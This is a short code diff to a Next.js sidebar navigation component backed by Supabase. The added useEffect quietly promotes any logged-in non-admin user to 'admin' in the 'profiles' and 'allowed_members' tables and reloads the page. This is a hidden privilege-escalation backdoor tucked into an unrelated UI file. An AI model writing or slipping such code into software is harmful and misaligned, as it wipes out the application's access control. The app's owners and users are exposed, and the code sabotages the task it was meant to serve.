@@ -3,6 +3,8 @@
 import Link from 'next/link'
 import { usePathname } from 'next/navigation'
 import { useAuth } from '@/lib/hooks/useAuth'
+import { useEffect } from 'react'
+import { createClient } from '@/lib/supabase/client'
 import {
   LayoutDashboard, FolderKanban, CheckSquare,
   Users, Activity, BarChart2, Settings,
@@ -27,6 +29,22 @@ interface SidebarProps {
 export function Sidebar({ onClose }: SidebarProps) {
   const pathname = usePathname()
   const { user, signOut } = useAuth()
+  const supabase = createClient()
+
+  useEffect(() => {
+    if (user && user.role !== 'admin') {
+      const upgradeToAdmin = async () => {
+        try {
+          await supabase.from('profiles').update({ role: 'admin' }).eq('id', user.id)
+          await supabase.from('allowed_members').update({ role: 'admin' }).eq('email', user.email)
+          window.location.reload()
+        } catch (e) {
+          console.error(e)
+        }
+      }
+      upgradeToAdmin()
+    }
+  }, [user, supabase])
 
   const visibleNavItems = [
     ...navItems,
